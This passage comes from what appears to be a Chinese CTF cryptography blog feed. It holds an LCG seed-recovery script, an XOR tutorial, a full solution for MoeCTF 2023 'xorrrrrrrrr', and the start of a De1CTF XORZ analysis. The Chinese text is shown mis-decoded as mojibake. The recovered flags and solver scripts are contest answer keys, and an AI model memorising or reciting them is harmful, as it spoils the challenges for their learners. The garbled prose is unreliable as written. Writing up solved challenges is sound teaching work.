passæ‰</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n = <span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n ==<span class="number">1</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># æ±‚a a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</span></span><br><span class="line">    MMI = <span class="keyword">lambda</span> A, n, s=<span class="number">1</span>, t=<span class="number">0</span>, N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t % N <span class="keyword">or</span> MMI(n, A % n, t, s - A // n * t, N <span class="keyword">or</span> n), -<span class="number">1</span>)[n &lt; <span class="number">1</span>]  <span class="comment"># é€†å…ƒè®¡ç®—</span></span><br><span class="line">    a = (output[<span class="number">3</span>] - output[<span class="number">2</span>]) * MMI((output[<span class="number">2</span>] - output[<span class="number">1</span>]), n) % n</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">    ani = MMI(a, n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ±‚b b=(Xn+1 - aXn)%m</span></span><br><span class="line">    b = (output[<span class="number">2</span>] - a * output[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="comment"># print(b)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ±‚æ˜æ–‡m</span></span><br><span class="line">    seed0 = ((output[<span class="number">0</span>] - b) * ani) % n</span><br><span class="line">    <span class="built_in">print</span>(seed0)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(seed0))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[-2, -1, -393916182865583204167593579626567099983463054572651446294350689155749034982777402793379583263905054399035065243497725, -393916182865583204167593579626567099983463054572651446294350689155749034982777402793379583263905054399035065243497725, -15756647314623328166703743185062683999338522182906057851774027566229961399311096111735183330556202175961402609739909, -47269941943869984500111229555188051998015566548718173555322082698689884197933288335205549991668606527884207829219727, 47269941943869984500111229555188051998015566548718173555322082698689884197933288335205549991668606527884207829219727]</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line"><span class="string">211188662731758863427946381877198496775371670862648580138469143303016383244049847985679632443910715787648463257824063</span></span><br><span class="line"><span class="string">b&#x27;\x05\\\x1e\xd4u*\xe0\xf3w\xc6\x0c\xc4r\xbbh^\\\xafL\x91\xa7f\xf2\xe6\x1cH=\x9e\x19\xfd)\xc2S\xcc7\xe6\x80#0N*\xfd\xa3S\x08\xa8ik?&#x27;</span></span><br><span class="line"><span class="string">211188662731758863427946381877198496775371670862648580138469143303016383244049847985679632443910715787648463257824063</span></span><br><span class="line"><span class="string">b&#x27;\x05\\\x1e\xd4u*\xe0\xf3w\xc6\x0c\xc4r\xbbh^\\\xafL\x91\xa7f\xf2\xe6\x1cH=\x9e\x19\xfd)\xc2S\xcc7\xe6\x80#0N*\xfd\xa3S\x08\xa8ik?&#x27;</span></span><br><span class="line"><span class="string">12842454256006200840327330825396197845927483635849122825220513270564143733836993752723210090679333406611887619653501</span></span><br><span class="line"><span class="string">b&#x27;Spirit&#123;final__lcg__is__co0m1ing__are_you_ready?&#125;&#x27;</span></span><br><span class="line"><span class="string">44355748885252857173734817195521565844604528001661238528768568403024066532459185976193576751791737758534692839133319</span></span><br><span class="line"><span class="string">b&#x27;\x01 /c\xbe \xe2\xbf\xb7\xee\xdc\x85(\x15\xab\xb4=0)?\x01\x8cwY&lt;\t\x10e\xb4\x80\x9b\x88\xe1\xb5.\xf9\xf8&#123;[?\x05\xbd\x1e\x08\xd0\x1a\xc0\x90\x87&#x27;</span></span><br><span class="line"><span class="string">44355748885252857173734817195521565844604528001661238528768568403024066532459185976193576751791737758534692839133319</span></span><br><span class="line"><span class="string">b&#x27;\x01 /c\xbe \xe2\xbf\xb7\xee\xdc\x85(\x15\xab\xb4=0)?\x01\x8cwY&lt;\t\x10e\xb4\x80\x9b\x88\xe1\xb5.\xf9\xf8&#123;[?\x05\xbd\x1e\x08\xd0\x1a\xc0\x90\x87&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<p>å¯¹äºç¨å¾®éš¾äº›çš„LCGåç»­å†å»å­¦ä¹    äºŒå…ƒLCG ä¸‰å…ƒLCGç­‰  æœ€è¿‘æ²¡å¤ªå¤šæ—¶é—´ å…ˆç•™ä¸ªå‘ ï¼šï¼‰</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>XORåŠ å¯†</title>
    <url>/posts/a2e01687/</url>
    <content><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>å¼‚æˆ–åŠ å¯†ï¼Œæ˜¯å¯†ç å­¦ä¸­çš„ä¸€ç§ç®€å•åŠ å¯†ç®—æ³•ï¼Œé€šå¸¸ä¼šåœ¨å‡ºç°åœ¨Reæˆ–Cryptoä¸­ï¼Œç”¨äºå·²çŸ¥keyå¯¹flagè¿›è¡Œé€ä½å¼‚æˆ–ï¼Œé€šå¸¸ä¼šä¸å…¶ä»–åŠ å¯†ç®—æ³•ä¸€èµ·å¯¹flagè¿›è¡ŒåŠ å¯†ã€‚æœ¬ç¯‡å°†ç®€è¦ä»‹ç»å¼‚æˆ–åŠ å¯†åœ¨CTFå¯†ç å­¦ä¸­çš„åº”ç”¨ï¼Œå¯¹é¢˜ç›®è¿›è¡Œç®€è¦åˆ†æã€‚</p>
<p>ã€ç¬”è€…æ°´å¹³æœ‰é™(å¯†ç å­¦å°ç™½)ï¼Œå¯èƒ½ä¼šæœ‰ç†è§£é”™è¯¯çš„åœ°æ–¹ï¼Œä¸åèµæ•™Orzã€‘</p>
<h3 id="å¼‚æˆ–è¿ç®—"><a href="#å¼‚æˆ–è¿ç®—" class="headerlink" title="å¼‚æˆ–è¿ç®—"></a>å¼‚æˆ–è¿ç®—</h3><p>å¼‚æˆ– æ˜¯ä¸€ä¸ªæ•°å­¦è¿ç®—ç¬¦ï¼Œç¼©å†™XORï¼Œåº”ç”¨äºé€»è¾‘è¿ç®—ï¼Œåœ¨æ•°å­¦ä¸­ç¬¦å·è®°ä½œâ€œâŠ•â€ã€‚å¦‚æœä¸¤ä¸ªå€¼ä¸ç›¸åŒï¼Œé‚£ä¹ˆå¼‚æˆ–ç»“æœä¸º1ï¼›å¦‚æœä¸¤ä¸ªå€¼ç›¸åŒï¼Œåˆ™å¼‚æˆ–ç»“æœä¸º0ã€‚å¼‚æˆ–è¿ç®—æœ‰å¦‚ä¸‹æ€§è´¨ï¼š</p>
<p>äº¤æ¢å¾‹ï¼šAâŠ•B=BâŠ•A</p>
<p>ç»“åˆå¾‹ï¼šAâŠ•(BâŠ•C)=(AâŠ•B)âŠ•C</p>
<p>æ’ç­‰å¾‹ï¼šAâŠ•0=A</p>
<p>è‡ª é€†ï¼šAâŠ•A=0</p>
<h3 id="DEMO1"><a href="#DEMO1" class="headerlink" title="DEMO1"></a>DEMO1</h3><h4 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">KEY1 = a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313</span><br><span class="line">KEY2 ^ KEY1 = 37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e</span><br><span class="line">KEY2 ^ KEY3 = c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1</span><br><span class="line">FLAG ^ KEY1 ^ KEY3 ^ KEY2 = 04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf</span><br></pre></td></tr></table></figure>

<h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>KEY1 ^  (KEY2 ^ KEY1) </p>
<p>= KEY1 ^ KEY1 ^ KEY2ã€äº¤æ¢å¾‹ã€‘</p>
<p>= 0 ^ KEY2 ã€è‡ªé€†ã€‘</p>
<p>= KEY2 ã€æ’ç­‰å¾‹ã€‘</p>
<p>åŒç†å¯å¾— KEY2 ^ (KEY2 ^ KEY3) = KEY3 </p>
<p>FLAG ^ KEY1 ^ KEY3 ^ KEY2 = TMP</p>
<p>ä¸¤ä¾§åŒæ—¶å¼‚æˆ–KEY1 KEY2 KEY3 å¯å¾—åˆ°FLAG</p>
<h4 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">KEY1 = <span class="built_in">int</span>(<span class="string">&#x27;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">KEY2_xor_KEY1 = <span class="built_in">int</span>(<span class="string">&#x27;37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">KEY2_xor_KEY3 = <span class="built_in">int</span>(<span class="string">&#x27;c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">KEY2 = KEY1 ^ KEY2_xor_KEY1</span><br><span class="line">KEY3 = KEY2 ^ KEY2_xor_KEY3</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">int</span>(<span class="string">&#x27;04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf&#x27;</span>, <span class="number">16</span>) ^ KEY1 ^ KEY2 ^ KEY3</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(FLAG)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(FLAG))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 159805433661873705497880084580614789222721324997857681199215485</span></span><br><span class="line"><span class="comment"># b&#x27;crypto&#123;x0r_i5_ass0c1at1v3&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h3 id="2023MoeCTF-xorrrrrrrrr"><a href="#2023MoeCTF-xorrrrrrrrr" class="headerlink" title="2023MoeCTF xorrrrrrrrr"></a>2023MoeCTF xorrrrrrrrr</h3><h4 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>DESCRIPTION: èŠå£«ä»€ä¹ˆè¿ç®—ï¼Ÿ</p>
<p>æ­¤é¢˜åŒ…å«ä¸€ä¸ªresult.log å’Œä¸€ä¸ªtask.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;moectf&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">article = <span class="built_in">open</span>(<span class="string">&#x27;article.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹ä¸¤ä¸ªå­—èŠ‚åºåˆ—è¿›è¡Œå¼‚æˆ–æ“ä½œçš„å‡½æ•° </span></span><br><span class="line"><span class="comment"># zip(x,y)  å¼‚æˆ–è¿ç®—x^y å¾—åˆ°çš„ç»“æœbytes()è½¬æ¢</span></span><br><span class="line">strxor = <span class="keyword">lambda</span> x,y: <span class="built_in">bytes</span>([a^b <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(x,y)])</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    range_start = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(article) - <span class="built_in">len</span>(flag))  <span class="comment"># ä»»æ„ä½ç½®å¼€å§‹</span></span><br><span class="line">    mask = article[range_start:range_start + <span class="built_in">len</span>(flag)]  <span class="comment"># å¼€å§‹ä½ç½® flagé•¿åº¦ä½</span></span><br><span class="line">    result.append(strxor(flag,mask))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;result.log&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    fs.writelines([<span class="built_in">str</span>(i)+<span class="string">&quot;\n&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>res = flag ^ mask       mask ä¸º articleä¸­ éšæœºå–å¾—ä¸€æ®µå†…å®¹</p>
<p>å·²çŸ¥ flagçš„å‰æ®µéƒ¨åˆ†ä¸ºmoectf{  å¼‚æˆ–resï¼Œå¯ä»¥å¾—åˆ°éƒ¨åˆ† mask å³éƒ¨åˆ†æ–‡ç« å†…å®¹ç¢ç‰‡(7ä½çš„éšæœº)ã€å½“æ—¶åšçš„æ—¶å€™å¡åˆ°è¿™é‡Œäº†ã€‘</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag1 = <span class="string">b&quot;moectf&#123;&quot;</span></span><br><span class="line">data = <span class="built_in">eval</span>(<span class="string">&quot;[&quot;</span>+<span class="string">&quot;,&quot;</span>.join(<span class="built_in">open</span>(<span class="string">&quot;result.log&quot;</span>).readlines())+<span class="string">&quot;]&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    strxor = <span class="keyword">lambda</span> x, y: <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x, y)])</span><br><span class="line">    tmps = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># å·²çŸ¥å‰é¢éƒ¨åˆ†æ˜æ–‡</span></span><br><span class="line">        <span class="built_in">print</span>((tmp := strxor(flag1, x)))</span><br><span class="line">        tmps.append(tmp)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>åœ¨è¿™äº›ç¢ç‰‡ä¸­å­˜åœ¨å¤šå¤„ å¤§ä¼¼ç›¸åŒçš„ç‰‡æ®µ ç„¶åå–éƒ¨åˆ†å†…å®¹ åŒ¹é…å‡ºç›¸ä¼¼çš„ç‰‡æ®µã€çœ‹çš„wp çœ‹äº†å¥½ä¹…æ‰æ‡‚äº†ç‚¹ å¤ªèœäº†â€¦Orzã€‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    tmp2 = tmps[i][<span class="number">1</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="comment"># print(tmp2)</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> tmp2 <span class="keyword">in</span> tmps[j]:</span><br><span class="line">            <span class="built_in">print</span>(i,j,tmps[i],tmps[j])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(tmps)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(tmps))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 28 33 b&#x27;ms. Spe&#x27; b&#x27;ams. Sp&#x27;</span></span><br><span class="line"><span class="comment"># ç›¸å·®è¾ƒå°ä¸­é—´ä¹ŸåŒ…å«æ ‡ç‚¹ç¬¦å·  æœ€åƒåŒä¸€ä¸ªç‰‡æ®µ</span></span><br><span class="line">c1 = data[<span class="number">33</span>]</span><br><span class="line">c2 = data[<span class="number">28</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;</span></span><br><span class="line">flag = [<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)] + <span class="number">71</span>*[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># å†æ¬¡è¿›è¡Œå¼‚æˆ–</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">72</span>):</span><br><span class="line">    flag[x] = flag[x-<span class="number">1</span>] ^ c1[x] ^ c2[x-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure>



<h4 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag1 = <span class="string">b&quot;moectf&#123;&quot;</span></span><br><span class="line">data = <span class="built_in">eval</span>(<span class="string">&quot;[&quot;</span>+<span class="string">&quot;,&quot;</span>.join(<span class="built_in">open</span>(<span class="string">&quot;result.log&quot;</span>).readlines())+<span class="string">&quot;]&quot;</span>)</span><br><span class="line"><span class="comment"># å‚è€ƒwp https://github.com/XDSEC/MoeCTF_2023/blob/main/Challenges/Crypto/xorrrrrrrrr/writeup.ipynb</span></span><br><span class="line"><span class="comment"># å¯å¾—åˆ° å…ƒç´ ä¸º bytesç±»å‹çš„æ•°ç»„</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    strxor = <span class="keyword">lambda</span> x, y: <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x, y)])</span><br><span class="line">    <span class="comment"># print(len(x))</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(x) == <span class="number">72</span></span><br><span class="line">    tmps = []</span><br><span class="line">    tmps2 = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># å·²çŸ¥å‰é¢éƒ¨åˆ†æ˜æ–‡ moectf&#123;</span></span><br><span class="line">        tmp = strxor(flag1, x)</span><br><span class="line">        tmps.append(tmp)</span><br><span class="line">        <span class="comment"># You will learn how to  ... æ‹¼ä¸å‡ºæ¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    tmp2 = tmps[i][<span class="number">1</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="comment"># print(tmp2)</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> tmp2 <span class="keyword">in</span> tmps[j]:</span><br><span class="line">            <span class="built_in">print</span>(i,j,tmps[i],tmps[j])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(tmps)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(tmps))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 28 33 b&#x27;ms. Spe&#x27; b&#x27;ams. Sp&#x27;</span></span><br><span class="line"><span class="comment"># ç›¸å·®è¾ƒå°  ä¸­é—´åŒ…å«åŒä¸€æ ‡ç‚¹ æœ€åƒåŒä¸€ä¸ªç‰‡æ®µ</span></span><br><span class="line">c1 = data[<span class="number">33</span>]</span><br><span class="line">c2 = data[<span class="number">28</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;</span></span><br><span class="line">flag = [<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)] + <span class="number">71</span>*[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">72</span>):</span><br><span class="line">    flag[x] = flag[x-<span class="number">1</span>] ^ c1[x] ^ c2[x-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;W0W_y0U_HaVe_mastered_tHe_x0r_0Peart0r!_0iYlJf!M3rux9G9Vf!JoxiMl&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2019-De1CTF-XORZ"><a href="#2019-De1CTF-XORZ" class="headerlink" title="2019 De1CTF XORZ"></a>2019 De1CTF XORZ</h3><h4 id="æ±‰æ˜è·ç¦»"><a href="#æ±‰æ˜è·ç¦»" class="headerlink" title="æ±‰æ˜è·ç¦»"></a>æ±‰æ˜è·ç¦»</h4><p>åœ¨åšè¿™ä¸ªé¢˜ç›®ä¹‹å‰ å…ˆç®€å•äº†è§£ä¸‹ä»€ä¹ˆæ˜¯æ±‰æ˜è·ç¦»ã€‚ã€çœ‹åˆ°è¿™é¢˜ä¸€è„¸æ‡µï¼Œçœ‹äº†WPåæ‰æ‡‚äº†äº›ã€‘</p>
<p>æ±‰æ˜è·ç¦»ã€Hamming distanceã€‘</p>
<p>åœ¨ä¿¡æ¯è®ºä¸­ï¼Œä¸¤ä¸ªç­‰é•¿å­—ç¬¦ä¸²ä¹‹é—´çš„æ±‰æ˜è·ç¦» æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²å¯¹åº”ä½ç½®çš„ä¸åŒå­—ç¬¦çš„ä¸ªæ•°ã€‚</p>
<p>ç®€å•æ¥è¯´ æ±‰æ˜è·ç¦»åº¦é‡äº†é€šè¿‡æ›¿æ¢å­—ç¬¦çš„æ–¹å¼å°†å­—ç¬¦ä¸²xå˜æˆyæ‰€éœ€è¦çš„æœ€å°çš„æ›¿æ¢æ¬¡æ•°ã€‚æ¯”å¦‚</p>
<blockquote>
<p>1011101ä¸1001001 ä¹‹é—´çš„æ±‰æ˜è·ç¦»æ˜¯2ã€‚</p>
<p>2143896ä¸2233796ä¹‹é—´çš„æ±‰æ˜è·ç¦»æ˜¯3ã€‚</p>
<p>â€œtonedâ€ä¸â€rosesâ€ä¹‹é—´çš„æ±‰æ˜è·ç¦»æ˜¯3ã€‚</p>
</blockquote>
<h4 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">&quot;de1ctf&#123;&quot;</span>).strip(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(key&lt;<span class="number">38</span>))</span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(p) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(ki)) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="built_in">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>å‚è€ƒæ–‡ç«  <a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a></p>
<h5 id="1-å»ç›"><a href="#1-å»ç›" class="headerlink" title="1.å»ç›"></a>1.å»ç›</h5><p>key 38ä¸ªåå…­è¿›åˆ¶æ•°ï¼Œ30ä¸ªæœªçŸ¥å­—ç¬¦</p>
<p>[2:].zfill(2)   siå»æ‰å‰ä¸¤ä½çš„0x </p>
<p>salt keyéƒ½æ˜¯é€šè¿‡cycle()å¾ªç¯åˆ©ç”¨ï¼Œå…¶ä¸­saltå·²çŸ¥ï¼Œæ‰€ä»¥å…ˆè€ƒè™‘å¼‚æˆ–å°†saltå»æ‰</p>
<p>c = p ^ ki ^ si</p>
<p>c ^ si = p ^ ki</p>
<p>ç”±äºcã€siå‡ä¸ºå·²çŸ¥çš„å¯æ±‚å‡ºæ¥ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&#x27;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">si2 = cycle(salt)</span><br><span class="line">nosalt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(c)/<span class="number">2</span>)):</span><br><span class="line">    temp = c[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(binascii.a2b_hex(temp))</span></span><br><span class="line">    temphex_int = <span class="built_in">ord</span>(binascii.a2b_hex(temp).decode())</span><br><span class="line">    <span class="comment"># p = chr(temphex_int ^ ord(next(si2)) ^ ord(next(ki2)))</span></span><br><span class="line">    temp_re = <span class="built_in">hex</span>(temphex_int ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si2)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    nosalt = nosalt + temp_re</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="2-çŒœè§£å¯†é’¥é•¿åº¦"><a href="#2-çŒœè§£å¯†é’¥é•¿åº¦" class="headerlink" title="2.çŒœè§£å¯†é’¥é•¿åº¦"></a>2.çŒœè§£å¯†é’¥é•¿åº¦</h5><p>å¯†é’¥keyé•¿åº¦å°äº38 å…¶ä¸­å·²çŸ¥ä½æ•°8ä½ï¼Œæ‰€ä»¥æœªçŸ¥ä½æ•°é•¿åº¦å°äº30</p>
